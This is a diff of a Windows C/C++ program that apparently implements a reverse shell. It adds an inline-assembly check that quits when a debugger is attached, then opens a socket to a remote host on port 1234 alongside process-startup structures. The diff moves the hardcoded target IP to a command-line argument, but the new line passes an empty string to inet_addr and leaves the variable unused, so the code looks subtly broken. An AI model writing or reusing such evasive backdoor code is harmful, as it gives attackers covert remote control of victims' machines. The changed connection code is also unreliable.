@@ -7,9 +7,9 @@
 bool presentDebugger( ){
 	
 	asm(
-	"movl $0x30,%ebx"
-	"movl %fs:(%ebx), %eax"
-	"movl 0x2(%eax),%eax"
+	"movl $0x30,%ebx\n\t"
+	"movl %fs:(%ebx), %eax\n\t"
+	"movl 0x2(%eax),%eax\n\t"
 	"and $0xff, %eax"
 	);
 	
@@ -24,20 +24,22 @@ using namespace std;
 /* run this program using the console pauser or add your own getch, system("pause") or input loop */
 
 int main(int argc, char** argv) {
-	
 	/*
 	 # for fun
 	*/
-	if( presentDebugger( ) ){
+	if( presentDebugger( ) || argc <= 1 ){
 		ExitProcess(0);
 	}
 	
+	char * ip;
 	STARTUPINFO si={sizeof(si)};
 	PROCESS_INFORMATION pi;
 	
 	SOCKET sock;
 	SOCKADDR_IN sin;
 	WSADATA wsd;
+	
+	ip = argv[1];
 	
 	memset( &pi, 0, sizeof(pi) );
 	memset( &wsd, 0, sizeof(wsd) );
@@ -53,7 +55,7 @@ int main(int argc, char** argv) {
 	
 	sin.sin_family 		= AF_INET;
 	sin.sin_port   		= htons(1234);
-	sin.sin_addr.s_addr = inet_addr("192.168.1.12");
+	sin.sin_addr.s_addr = inet_addr( "" );
 	printf("[+] Socket created\r\n" );
 	printf("[+] connect on 0x%08x \r\n", sin.sin_addr.s_addr );
 	printf("[+] listen on  %i \r\n", sin.sin_port );
